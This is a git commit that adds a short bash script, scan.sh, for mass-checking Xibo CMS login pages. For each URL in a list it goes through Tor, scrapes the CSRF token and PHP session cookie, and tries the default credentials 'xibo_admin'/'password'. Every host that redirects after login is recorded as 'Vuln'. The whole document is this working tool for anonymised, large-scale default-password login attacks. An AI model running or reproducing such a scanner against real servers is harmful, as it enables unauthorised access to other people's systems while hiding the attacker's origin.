56186f0ac62b08ffbd9daaf7211796cc2fe4264b
Ug0Security <c.vallicari@gmail.com>
2022-04-01 17:55:22 +0200

    Create scan.sh

---
+++ scan.sh
@@ -0,0 +1,20 @@
+cat urls | while read line
+do
+echo $line
+echo ""
+resp=$(torify timeout 5 curl -skD -  $line/login > ./hey)
+
+
+csrf=$(cat ./hey | grep "csrfToken" | grep -o -P '(?<=value=").*(?=" />)') 
+cook=$(cat ./hey  | grep "PHPSESSID" | grep -o -P '(?<=PHPSESSID=).*(?=; path)') 
+
+check=$(torify timeout 5 curl -skD - -X POST $line/login -d "priorRoute=&csrfToken=$csrf&username=xibo_admin&password=password" -H "Cookie: PHPSESSID=$cook" -H "Content-Type: application/x-www-form-urlencoded" | grep "Location: /")
+
+if [ ! -z "$check" ];
+then
+echo "Vuln !"
+echo $line >> vuln.txt
+fi
+echo ""
+echo ""
+done
